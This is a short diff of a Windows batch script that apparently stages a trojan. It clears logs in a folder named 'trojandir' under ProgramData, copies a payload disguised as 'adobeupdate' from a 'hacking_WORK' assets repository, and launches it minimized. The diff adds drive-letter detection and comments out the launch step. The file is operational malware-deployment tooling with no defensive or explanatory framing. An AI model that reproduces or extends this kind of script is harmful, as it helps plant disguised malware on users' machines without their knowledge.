@@ -1,3 +1,5 @@
+FOR /F "tokens=1,2" %%A IN ('wmic logicaldisk get name^,volumename 2^>nul ^| findstr /I /C:"MAIN"') DO SET "DRIVE_LETTER=%%A"
+
 set trojandir=C:\ProgramData\owd
 cd /d %trojandir%
 
@@ -6,6 +8,6 @@ del /f /q *.log
 del /f /q adobeupdate
 del /f /q *_running
 
-copy /y E:\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\adobeupdate .
-copy /y E:\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\launch.cmd .
-start "" /min launch.cmd
+copy /y %DRIVE_LETTER%\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\adobeupdate .
+REM copy /y E:\WORKING\hacking_WORK\DevOps\git_repo\mothershipassets\tpl_launch.cmd .
+REM start "" /min launch.cmd
